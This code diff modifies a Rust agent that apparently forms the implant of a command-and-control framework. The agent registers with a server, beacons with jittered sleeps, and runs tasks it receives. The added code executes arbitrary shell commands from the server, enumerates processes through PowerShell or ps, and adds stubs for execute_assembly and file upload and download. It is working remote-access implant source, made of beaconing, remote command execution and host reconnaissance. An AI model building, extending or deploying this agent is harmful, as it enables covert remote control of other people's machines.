@@ -8,12 +8,22 @@ use crate::error::Error;
 use crate::executor::CommandExecutor;
 use crate::system_info::SystemInfo;
 use crate::transport::{Task, Transport};
+use serde::Deserialize;
 
 pub struct Agent<T: Transport, E: CommandExecutor> {
     config: Config,
     transport: T,
     executor: E,
     id: Option<String>,
+}
+
+use serde::{Serialize};
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ProcessEntry {
+    pub pid: u32,
+    pub ppid: u32,
+    pub name: String,
 }
 
 impl<T: Transport, E: CommandExecutor> Agent<T, E> {
@@ -39,7 +49,10 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
         );
 
         loop {
-            std::thread::sleep(self.next_sleep());
+            std::thread::sleep(
+                self.next_sleep(),
+            );
+
             self.beacon();
         }
     }
@@ -50,8 +63,13 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
         loop {
             match self.transport.register(&info) {
                 Ok(id) => {
-                    info!(%id, "registered with server");
+                    info!(
+                        %id,
+                        "registered with server"
+                    );
+
                     self.id = Some(id);
+
                     return;
                 }
 
@@ -62,7 +80,7 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
                     );
 
                     std::thread::sleep(
-                        self.config.retry_delay
+                        self.config.retry_delay,
                     );
                 }
             }
@@ -74,28 +92,36 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
             Some(id) => id,
 
             None => {
-                warn!("not registered yet");
-                return;
-            }
-        };
-
-        let task = match self.transport.get_task(&id) {
-            Ok(task) => task,
-
-            Err(e) => {
                 warn!(
-                    error = %e,
-                    "task check failed"
+                    "not registered yet"
                 );
 
                 return;
             }
         };
 
-        let output = self.dispatch_task(task);
+        let task =
+            match self.transport.get_task(&id) {
+                Ok(task) => task,
+
+                Err(e) => {
+                    warn!(
+                        error = %e,
+                        "task check failed"
+                    );
+
+                    return;
+                }
+            };
+
+        let output =
+            self.dispatch_task(task);
 
         if let Err(e) =
-            self.transport.send_result(&id, &output)
+            self.transport.send_result(
+                &id,
+                &output,
+            )
         {
             warn!(
                 error = %e,
@@ -104,23 +130,40 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
         }
     }
 
-    fn dispatch_task(&self, task: Task) -> String {
+    fn dispatch_task(
+        &self,
+        task: Task,
+    ) -> String {
         match task.task_type.as_str() {
-            "shell" => {
-                let command = match task.command {
-                    Some(command) if !command.is_empty() => command,
 
-                    _ => {
-                        return "shell task has no command".into();
-                    }
-                };
+            "none" => {
+                String::new()
+            }
+
+            "shell" => {
+                let command =
+                    match task.command {
+                        Some(command)
+                        if !command.is_empty() =>
+                            {
+                                command
+                            }
+
+                        _ => {
+                            return
+                                "shell task has no command"
+                                    .into();
+                        }
+                    };
 
                 debug!(
                     command = %command,
                     "dispatching shell task"
                 );
 
-                match self.executor.execute(&command) {
+                match self.executor.execute(
+                    &command,
+                ) {
                     Ok(output) => output,
 
                     Err(e) => {
@@ -129,10 +172,20 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
                 }
             }
 
+            "process_tree" => {
+                debug!(
+                    "process_tree task received"
+                );
+
+                self.collect_process_tree()
+            }
+
             "payload" => {
                 let payload_id =
                     task.payload_id
-                        .unwrap_or_else(|| "unknown".into());
+                        .unwrap_or_else(
+                            || "unknown".into(),
+                        );
 
                 debug!(
                     payload_id = %payload_id,
@@ -140,9 +193,69 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
                 );
 
                 format!(
-                    "payload task received: {}",
+                    "type=payload payload_id={}",
                     payload_id
                 )
+            }
+
+            "process" => {
+                debug!("process tree task received");
+
+                match collect_processes() {
+                    Ok(output) => output,
+
+                    Err(e) => {
+                        format!("process enumeration error: {e}")
+                    }
+                }
+            }
+
+            "execute_assembly" => {
+                let payload_id =
+                    task.payload_id
+                        .unwrap_or_else(
+                            || "unknown".into(),
+                        );
+
+                debug!(
+                    payload_id = %payload_id,
+                    "execute_assembly task received"
+                );
+
+                format!(
+                    "type=execute_assembly payload_id={}",
+                    payload_id
+                )
+            }
+
+            "file_upload" => {
+                let payload_id =
+                    task.payload_id
+                        .unwrap_or_else(
+                            || "unknown".into(),
+                        );
+
+                format!(
+                    "type=file_upload payload_id={}",
+                    payload_id
+                )
+            }
+
+            "file_download" => {
+                let payload_id =
+                    task.payload_id
+                        .unwrap_or_else(
+                            || "unknown".into(),
+                        );
+
+                format!(
+                    "type=file_download payload_id={}",
+                    payload_id
+                )
+            }
+
+            "sleep" => {
+                "type=sleep".into()
             }
 
             other => {
@@ -154,8 +267,50 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
         }
     }
 
+    fn collect_process_tree(&self) -> String {
+        #[cfg(windows)]
+        {
+            let command = r#"powershell.exe -NoProfile -NonInteractive -Command "$ErrorActionPreference='Stop'; Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name | ConvertTo-Json -Compress""#;
+
+            match self.executor.execute(
+                command,
+            ) {
+                Ok(output) => output,
+
+                Err(e) => {
+                    format!(
+                        r#"{{"error":"{}"}}"#,
+                        escape_json(
+                            &e.to_string()
+                        )
+                    )
+                }
+            }
+        }
+
+        #[cfg(not(windows))]
+        {
+            let command =
+                "ps -eo pid=,ppid=,comm= --no-headers";
+
+            match self.executor.execute(
+                command,
+            ) {
+                Ok(output) => output,
+
+                Err(e) => {
+                    format!(
+                        "process enumeration error: {}",
+                        e
+                    )
+                }
+            }
+        }
+    }
+
     fn next_sleep(&self) -> Duration {
-        let jitter = self.config.jitter;
+        let jitter =
+            self.config.jitter;
 
         if jitter <= 0.0 {
             return self.config.sleep;
@@ -171,6 +326,58 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
         )
     }
 }
+fn collect_processes() -> Result<String, Error> {
+    #[cfg(windows)]
+    {
+        let output = std::process::Command::new("powershell")
+            .args([
+                "-NoProfile",
+                "-NonInteractive",
+                "-Command",
+                r#"
+Get-CimInstance Win32_Process |
+    Select-Object Name,ProcessId,ParentProcessId |
+    ConvertTo-Json -Compress
+"#,
+            ])
+            .output()
+            .map_err(|e| Error::Command(e.to_string()))?;
+
+        if !output.status.success() {
+            return Err(Error::Command(
+                String::from_utf8_lossy(&output.stderr).to_string(),
+            ));
+        }
+
+        let stdout =
+            String::from_utf8_lossy(&output.stdout).trim().to_string();
+
+        if stdout.is_empty() {
+            return Ok("[]".to_string());
+        }
+
+        let json = if stdout.starts_with('[') {
+            stdout
+        } else {
+            format!("[{}]", stdout)
+        };
+
+        let processes: Vec<ProcessEntry> =
+            serde_json::from_str(&json)
+                .map_err(|e| Error::Command(e.to_string()))?;
+
+        return serde_json::to_string(&processes)
+            .map_err(|e| Error::Command(e.to_string()));
+    }
+
+    #[cfg(not(windows))]
+    {
+        Err(Error::Command(
+            "process enumeration is not implemented for this platform"
+                .to_string(),
+        ))
+    }
+}
 
 fn apply_jitter(
     base: Duration,
@@ -180,7 +387,17 @@ fn apply_jitter(
     let multiplier =
         1.0
             - jitter
-            + 2.0 * jitter * factor.clamp(0.0, 1.0);
+            + 2.0
+            * jitter
+            * factor.clamp(0.0, 1.0);
 
     base.mul_f64(multiplier)
+}
+
+fn escape_json(value: &str) -> String {
+    value
+        .replace('\\', "\\\\")
+        .replace('"', "\\\"")
+        .replace('\n', "\\n")
+        .replace('\r', "\\r")
 }
